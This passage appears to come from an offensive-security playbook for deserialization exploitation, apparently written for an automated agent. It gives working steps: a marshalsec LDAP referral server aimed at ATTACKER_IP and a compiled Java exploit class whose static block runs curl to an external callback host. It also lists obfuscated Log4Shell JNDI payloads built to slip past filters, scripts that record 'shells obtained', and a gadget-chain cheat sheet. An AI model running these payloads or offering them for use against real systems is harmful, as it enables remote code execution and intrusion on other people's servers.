‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Clone marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# Start LDAP server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer \
    "http://ATTACKER_IP:8888/#Exploit" \
    1389

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.2 Create Malicious Class
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# create_exploit_class.sh

cat > temp/agent1/deser/Exploit.java << 'EOF'
import java.io.*;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl https://CALLBACK.oast.fun/jndi-rce");
        } catch (Exception e) {}
    }
}
EOF

# Compile (requires JDK)
cd temp/agent1/deser
javac Exploit.java

# Serve via HTTP
python3 -m http.server 8888 &

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.3 Log4Shell Style Payloads
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Log4Shell (CVE-2021-44228) JNDI injection points

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

LOG4J_PAYLOADS=(
    '${jndi:ldap://CALLBACK/a}'
    '${jndi:rmi://CALLBACK/a}'
    '${jndi:dns://CALLBACK/a}'
    '${${lower:j}ndi:ldap://CALLBACK/a}'
    '${${::-j}${::-n}${::-d}${::-i}:ldap://CALLBACK/a}'
    '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//CALLBACK/a}'
)

# Update callback
for payload in "${LOG4J_PAYLOADS[@]}"; do
    echo "${payload//CALLBACK/${CALLBACK}}"
done > temp/agent1/deser/log4j_payloads.txt

================================================================================
PHASE 7: DOCUMENT RESULTS
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
7.1 Consolidate RCE Results
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# consolidate_deser_rce.sh

echo "# Deserialization RCE Results" > outputs/deser/shells_obtained.txt
echo "# Generated: $(date)" >> outputs/deser/shells_obtained.txt
echo "" >> outputs/deser/shells_obtained.txt

# Check interactsh logs for successful callbacks
# Format: url|language|gadget|callback_id

echo "## Java RCE" >> outputs/deser/shells_obtained.txt
cat outputs/deser/java_rce_confirmed.txt 2>/dev/null >> outputs/deser/shells_obtained.txt

echo "" >> outputs/deser/shells_obtained.txt
echo "## PHP RCE" >> outputs/deser/shells_obtained.txt
cat outputs/deser/php_rce_confirmed.txt 2>/dev/null >> outputs/deser/shells_obtained.txt

echo "" >> outputs/deser/shells_obtained.txt
echo "## Python RCE" >> outputs/deser/shells_obtained.txt
cat outputs/deser/python_rce_confirmed.txt 2>/dev/null >> outputs/deser/shells_obtained.txt

echo "" >> outputs/deser/shells_obtained.txt
echo "## .NET RCE" >> outputs/deser/shells_obtained.txt
cat outputs/deser/dotnet_rce_confirmed.txt 2>/dev/null >> outputs/deser/shells_obtained.txt

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
7.2 Document Successful Gadgets
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# document_gadgets.sh

echo "# Successful Gadget Chains" > outputs/deser/gadget_chains_used.txt
echo "# Format: target|language|gadget|command|notes" >> outputs/deser/gadget_chains_used.txt
echo "" >> outputs/deser/gadget_chains_used.txt

# After interactsh analysis, document which gadgets worked
# Example:
# https://target.com/api|java|CommonsCollections5|curl|JBoss 6.x
# https://target.com/session|php|Laravel/RCE1|system|Laravel 5.8
# https://target.com/data|python|pickle_os_system|curl|Flask app

================================================================================
SUMMARY & STATISTICS
================================================================================

echo ""
echo "=========================================="
echo "TASK 77 SUMMARY - Deserialization Exploitation"
echo "=========================================="
echo "Java RCE confirmed:    $(wc -l < outputs/deser/java_rce_confirmed.txt 2>/dev/null || echo 0)"
echo "PHP RCE confirmed:     $(wc -l < outputs/deser/php_rce_confirmed.txt 2>/dev/null || echo 0)"
echo "Python RCE confirmed:  $(wc -l < outputs/deser/python_rce_confirmed.txt 2>/dev/null || echo 0)"
echo ".NET RCE confirmed:    $(wc -l < outputs/deser/dotnet_rce_confirmed.txt 2>/dev/null || echo 0)"
echo "JSON deser results:    $(wc -l < outputs/deser/json_deser_results.txt 2>/dev/null || echo 0)"
echo ""
echo "Shells obtained: outputs/deser/shells_obtained.txt"
echo "Gadgets used: outputs/deser/gadget_chains_used.txt"

================================================================================
‚ö†Ô∏è COMMON MISTAKES TO AVOID ‚ö†Ô∏è
================================================================================

‚ùå Using wrong gadget chain for target
   ‚Üí Check dependencies on target before selecting gadget

‚ùå Not setting up OOB listener
   ‚Üí Most deserialization is blind, requires callback verification

‚ùå Forgetting about JNDI restrictions
   ‚Üí Java 8u191+ has JNDI lookup restrictions, need marshalsec

‚ùå Not trying multiple protocols
   ‚Üí ldap://, rmi://, dns://, http:// may have different results

‚ùå Ignoring JSON deserializers
   ‚Üí Fastjson, Jackson, XStream are common and exploitable

‚ùå Not documenting successful gadgets
   ‚Üí Different targets may need different chains

================================================================================
üìö REFERENCE: GADGET CHAIN CHEAT SHEET
================================================================================

JAVA YSOSERIAL (by reliability):
1. CommonsCollections5/6 - Most reliable for older apps
2. CommonsCollections7 - Commons Collections 3.2.2+
3. CommonsBeanutils1 - Apache Commons BeanUtils
4. Jdk7u21 - No dependencies (raw JDK)
5. Spring1/2 - Spring Framework apps

PHP PHPGGC (by framework):
- Laravel: Laravel/RCE1-16
- Symfony: Symfony/RCE1-4
- Yii: Yii/RCE1-2
- Guzzle: Guzzle/RCE1
- Monolog: Monolog/RCE1-3

PYTHON PICKLE:
- os.system / subprocess - Standard library
- eval / exec - For code execution

.NET:
- TypeConfuseDelegate - Most reliable
- ObjectDataProvider - XAML apps
- TextFormattingRunProperties - WPF

JSON:
- Fastjson: @type + JdbcRowSetImpl
- Jackson: Default typing + various gadgets
- XStream: EventHandler/ProcessBuilder
